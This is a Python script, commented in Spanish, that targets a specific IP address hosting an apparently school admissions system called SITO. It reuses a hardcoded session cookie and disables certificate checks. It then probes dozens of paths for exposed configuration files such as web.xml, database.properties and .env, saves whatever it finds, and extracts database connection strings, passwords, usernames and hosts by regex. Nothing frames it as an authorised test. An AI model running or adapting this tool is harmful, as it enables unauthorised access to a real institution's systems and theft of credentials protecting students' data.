# sito_config_finder.py
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SITOConfigFinder:
    def __init__(self):
        self.base_url = "https://189.254.143.102"
        self.session = requests.Session()
        self.session.verify = False
        self.session.cookies.set('JSESSIONID', '3B0DDD39CD0068BB30ED28B8C75B2A38')
        
    def find_config_files(self):
        """Busca archivos de configuración de la aplicación SITO"""
        print("=== BUSCANDO CONFIGURACIONES SITO ===")
        
        # Archivos de configuración comunes en aplicaciones web
        config_files = [
            "/WEB-INF/web.xml",
            "/WEB-INF/classes/database.properties",
            "/WEB-INF/classes/config.properties",
            "/WEB-INF/classes/application.properties",
            "/WEB-INF/classes/hibernate.cfg.xml",
            "/WEB-INF/classes/jdbc.properties",
            "/META-INF/context.xml",
            "/config.xml",
            "/database.xml",
            "/settings.properties",
            "/.env",
            "/config/database.php",
            "/inc/config.php"
        ]
        
        # Probarlos en diferentes ubicaciones de SITO
        bases = [
            "/jsp/",
            "/jsp/escolar/",
            "/jsp/escolar/proceso_admision/", 
            "/SITO/",
            "/webapps/SITO/",
            "/"
        ]
        
        for base in bases:
            print(f"\n🔍 Buscando en: {base}")
            for config_file in config_files:
                url = f"{self.base_url}{base}{config_file}"
                try:
                    response = self.session.get(url, timeout=5)
                    if response.status_code == 200 and len(response.text) > 10:
                        print(f"✅ CONFIGURACIÓN ENCONTRADA: {config_file}")
                        
                        # Analizar contenido
                        self.analyze_config_content(response.text, config_file)
                        
                        # Guardar archivo
                        filename = f"sito_config_{config_file.replace('/', '_')}.txt"
                        with open(filename, 'w', encoding='utf-8') as f:
                            f.write(response.text)
                        print(f"💾 Guardado como: {filename}")
                        
                except:
                    pass
    
    def analyze_config_content(self, content, filename):
        """Analiza el contenido de archivos de configuración"""
        content_lower = content.lower()
        
        sensitive_patterns = {
            'jdbc_connections': r'jdbc:mysql://[^\s"\']+',
            'passwords': r'password\s*[=:]\s*[\'"]([^\'"]+)[\'"]',
            'usernames': r'username\s*[=:]\s*[\'"]([^\'"]+)[\'"]',
            'hosts': r'host\s*[=:]\s*[\'"]([^\'"]+)[\'"]',
            'databases': r'database\s*[=:]\s*[\'"]([^\'"]+)[\'"]'
        }
        
        for pattern_name, pattern in sensitive_patterns.items():
            import re
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                print(f"   🔍 {pattern_name}: {matches}")

# Ejecutar
if __name__ == "__main__":
    finder = SITOConfigFinder()
    finder.find_config_files()